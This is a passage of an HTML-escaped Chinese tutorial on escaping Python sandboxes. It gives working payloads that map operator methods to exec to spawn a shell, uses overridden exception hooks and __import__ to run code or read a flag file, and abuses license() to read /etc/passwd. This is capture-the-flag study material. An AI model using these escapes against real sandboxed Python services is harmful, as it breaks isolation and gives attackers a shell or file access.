class=&#34;line&#34;&gt;Sub[&lt;span class=&#34;string&#34;&gt;&amp;#x27;import os; os.system(&amp;quot;sh&amp;quot;)&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;除了  &lt;code&gt;__getitem__&lt;/code&gt;  之外其他方法的利用方式如下:&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Python&#34;&gt;&lt;figure class=&#34;iseeu highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;__sub__ (k - &lt;span class=&#34;string&#34;&gt;&amp;#x27;import os; os.system(&amp;quot;sh&amp;quot;)&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__mul__ (k * &lt;span class=&#34;string&#34;&gt;&amp;#x27;import os; os.system(&amp;quot;sh&amp;quot;)&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__floordiv__ (k // &lt;span class=&#34;string&#34;&gt;&amp;#x27;import os; os.system(&amp;quot;sh&amp;quot;)&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__truediv__ (k / &lt;span class=&#34;string&#34;&gt;&amp;#x27;import os; os.system(&amp;quot;sh&amp;quot;)&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__mod__ (k % &lt;span class=&#34;string&#34;&gt;&amp;#x27;import os; os.system(&amp;quot;sh&amp;quot;)&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__pow__ (k**&lt;span class=&#34;string&#34;&gt;&amp;#x27;import os; os.system(&amp;quot;sh&amp;quot;)&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__lt__ (k &amp;lt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;import os; os.system(&amp;quot;sh&amp;quot;)&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__le__ (k &amp;lt;= &lt;span class=&#34;string&#34;&gt;&amp;#x27;import os; os.system(&amp;quot;sh&amp;quot;)&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__eq__ (k == &lt;span class=&#34;string&#34;&gt;&amp;#x27;import os; os.system(&amp;quot;sh&amp;quot;)&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__ne__ (k != &lt;span class=&#34;string&#34;&gt;&amp;#x27;import os; os.system(&amp;quot;sh&amp;quot;)&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__ge__ (k &amp;gt;= &lt;span class=&#34;string&#34;&gt;&amp;#x27;import os; os.system(&amp;quot;sh&amp;quot;)&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__gt__ (k &amp;gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;import os; os.system(&amp;quot;sh&amp;quot;)&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__iadd__ (k += &lt;span class=&#34;string&#34;&gt;&amp;#x27;import os; os.system(&amp;quot;sh&amp;quot;)&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__isub__ (k -= &lt;span class=&#34;string&#34;&gt;&amp;#x27;import os; os.system(&amp;quot;sh&amp;quot;)&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__imul__ (k *= &lt;span class=&#34;string&#34;&gt;&amp;#x27;import os; os.system(&amp;quot;sh&amp;quot;)&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__ifloordiv__ (k //= &lt;span class=&#34;string&#34;&gt;&amp;#x27;import os; os.system(&amp;quot;sh&amp;quot;)&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__idiv__ (k /= &lt;span class=&#34;string&#34;&gt;&amp;#x27;import os; os.system(&amp;quot;sh&amp;quot;)&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__itruediv__ (k /= &lt;span class=&#34;string&#34;&gt;&amp;#x27;import os; os.system(&amp;quot;sh&amp;quot;)&amp;#x27;&lt;/span&gt;) (Note that this only works when &lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; __future__ &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; division &lt;span class=&#34;keyword&#34;&gt;is&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; effect.)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__imod__ (k %= &lt;span class=&#34;string&#34;&gt;&amp;#x27;import os; os.system(&amp;quot;sh&amp;quot;)&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__ipow__ (k **= &lt;span class=&#34;string&#34;&gt;&amp;#x27;import os; os.system(&amp;quot;sh&amp;quot;)&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__ilshift__ (k&amp;lt;&amp;lt;= &lt;span class=&#34;string&#34;&gt;&amp;#x27;import os; os.system(&amp;quot;sh&amp;quot;)&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__irshift__ (k &amp;gt;&amp;gt;= &lt;span class=&#34;string&#34;&gt;&amp;#x27;import os; os.system(&amp;quot;sh&amp;quot;)&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__iand__ (k = &lt;span class=&#34;string&#34;&gt;&amp;#x27;import os; os.system(&amp;quot;sh&amp;quot;)&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__ior__ (k |= &lt;span class=&#34;string&#34;&gt;&amp;#x27;import os; os.system(&amp;quot;sh&amp;quot;)&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__ixor__ (k ^= &lt;span class=&#34;string&#34;&gt;&amp;#x27;import os; os.system(&amp;quot;sh&amp;quot;)&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;示例:&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Python&#34;&gt;&lt;figure class=&#34;iseeu highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Metaclass&lt;/span&gt;(&lt;span class=&#34;title class_ inherited__&#34;&gt;type&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    __sub__ = &lt;span class=&#34;built_in&#34;&gt;exec&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Sub&lt;/span&gt;(metaclass=Metaclass):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;pass&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Sub-&lt;span class=&#34;string&#34;&gt;&amp;#x27;import os; os.system(&amp;quot;sh&amp;quot;)&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;h6 id=&#34;exceptions-利用&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#exceptions-利用&#34;&gt;#&lt;/a&gt; exceptions 利用&lt;/h6&gt;
&lt;p&gt;利用 exceptions 的目的也是为了绕过显示地实例化一个类，如果一个类继承了 Exception 类，那么就可以通过 raise 关键字来实例化. payload 如下:&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Py&#34;&gt;&lt;figure class=&#34;iseeu highlight py&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;RCE&lt;/span&gt;(&lt;span class=&#34;title class_ inherited__&#34;&gt;Exception&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;__init__&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;self&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        self += &lt;span class=&#34;string&#34;&gt;&amp;#x27;import os; os.system(&amp;quot;sh&amp;quot;)&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    __iadd__ = &lt;span class=&#34;built_in&#34;&gt;exec&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;raise&lt;/span&gt; RCE &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;raise 会进入 RCE 的  &lt;code&gt;__init__&lt;/code&gt; , 然后触发  &lt;code&gt;__iadd__&lt;/code&gt;  也就是 exec.&lt;/p&gt;
&lt;p&gt;当然，触发异常不一定需要 raise, 主动地编写错误代码也可以触发，与是就有了如下的几种 payload.&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Py&#34;&gt;&lt;figure class=&#34;iseeu highlight py&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;X&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;__init__&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;self, a, b, c&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        self += &lt;span class=&#34;string&#34;&gt;&amp;quot;os.system(&amp;#x27;sh&amp;#x27;)&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    __iadd__ = &lt;span class=&#34;built_in&#34;&gt;exec&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sys.excepthook = X&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;/&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;这个 payload 中直接将 sys.excepthook 进行覆盖，任何异常产生时都会触发.&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Python&#34;&gt;&lt;figure class=&#34;iseeu highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;X&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;__init__&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;self, a, b, c, d, e&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    self += &lt;span class=&#34;string&#34;&gt;&amp;quot;print(open(&amp;#x27;flag&amp;#x27;).read())&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __iadd__ = &lt;span class=&#34;built_in&#34;&gt;eval&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__builtins__.&lt;span class=&#34;built_in&#34;&gt;__import__&lt;/span&gt; = X&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&amp;#125;[&lt;span class=&#34;number&#34;&gt;1337&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;这个 payload 将  &lt;code&gt;__import__&lt;/code&gt;  函数进行覆盖，最后的 {}[1337] 在正常情况下会引发 KeyError 异常，因为 Python 在引发异常时会尝试导入某些模块（比如 traceback 模块），导入时就会触发  &lt;code&gt;__import__&lt;/code&gt; .&lt;/p&gt;
&lt;h5 id=&#34;通过-license-函数读取文件&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#通过-license-函数读取文件&#34;&gt;#&lt;/a&gt; 通过 license 函数读取文件&lt;/h5&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Python&#34;&gt;&lt;figure class=&#34;iseeu highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;__builtins__.__dict__[&lt;span class=&#34;string&#34;&gt;&amp;quot;license&amp;quot;&lt;/span&gt;]._Printer__filenames=[&lt;span class=&#34;string&#34;&gt;&amp;quot;/etc/passwd&amp;quot;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;a = __builtins__.&lt;span class=&#34;built_in&#34;&gt;help&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;a.__class__.__enter__ = __builtins__.__dict__[&lt;span class=&#34;string&#34;&gt;&amp;quot;license&amp;quot;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;a.__class__.__exit__ = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt; self, *args: &lt;span class=&#34;literal&#34;&gt;None&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;with&lt;/span&gt; (a &lt;span class=&#34;keyword&#34;&gt;as&lt;/span&gt; b):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;pass&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;上面的 payload 修改内建函数 license 的文件名列表为 /etc/passwd 当调用  &lt;code&gt;license()&lt;/code&gt;  时会打印这个文件的内容.&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Sh&#34;&gt;&lt;figure class=&#34;iseeu highlight sh&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;gt;&amp;gt;&amp;gt; __builtins__.__dict__[&lt;span class=&#34;string&#34;&gt;&amp;quot;license&amp;quot;&lt;/span&gt;]._Printer__filenames&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;/usr/lib/python3.11/../LICENSE.txt&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;/usr/lib/python3.11/../LICENSE&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;/usr/lib/python3.11/LICENSE.txt&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;/usr/lib/python3.11/LICENSE&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;./LICENSE.txt&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;./LICENSE&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;payload 中将 help 类的  &lt;code&gt;__enter__&lt;/code&gt;  方法覆盖为  &lt;code&gt;license&lt;/code&gt;  方法，而  &lt;code&gt;with&lt;/code&gt;  语句在创建上下文时会调用 help 的 &lt;code&gt;__enter__&lt;/code&gt; , 从而执行  &lt;code&gt;license&lt;/code&gt;  方法。这里的 help 类只是一个载体，替换为其他的支持上下文的类或者自定义一个类也是可以的。例如:&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Py&#34;&gt;&lt;figure class=&#34;iseeu highlight py&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;MyContext&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;pass&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__builtins__.__dict__[&lt;span class=&#34;string&#34;&gt;&amp;quot;license&amp;quot;&lt;/span&gt;]._Printer__filenames=[&lt;span class=&#34;string&#34;&gt;&amp;quot;/etc/passwd&amp;quot;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;a = MyContext()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;a.__class__.__enter__ = __builtins__.__dict__[&lt;span class=&#34;string&#34;&gt;&amp;quot;license&amp;quot;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;a.__class__.__exit__ = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt; self, *args: &lt;span class=&#34;literal&#34;&gt;None&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;with&lt;/span&gt; (a &lt;span class=&#34;keyword&#34;&gt;as&lt;/span&gt; b):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;pass&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;h4 id=&#34;绕过-astattribute-获取属性&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#绕过-astattribute-获取属性&#34;&gt;#&lt;/a&gt; 绕过 ast.Attribute 获取属性&lt;/h4&gt;
&lt;p&gt;如何绕过 ast.Attribute？python 3.10 中引入了一个新的特性：match/case，类似其他语言中的 switch/case，但 match/case 更加强大，除了可以匹配数字字符串之外，还可以匹配字典、对象等。&lt;/p&gt;
&lt;p&gt;最简单的示例，匹配字符串：&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Python&#34;&gt;&lt;figure class=&#34;iseeu highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;item = &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;match&lt;/span&gt; item:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;One&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Two&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 